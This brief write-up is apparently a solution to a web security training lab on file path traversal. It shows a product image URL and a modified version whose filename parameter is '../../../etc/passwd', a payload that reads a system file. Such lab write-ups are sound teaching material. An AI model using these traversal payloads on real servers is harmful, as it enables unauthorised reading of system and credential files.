# Reading arbitrary files via directory traversal

## File path traversal, simple case

This lab contains a file path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

Target URL:

```
https://ac591fe01e85e211c07944a800930023.web-security-academy.net/image?filename=1.jpg
```

Modified URL:

```
https://ac591fe01e85e211c07944a800930023.web-security-academy.net/image?filename=../../../etc/passwd
```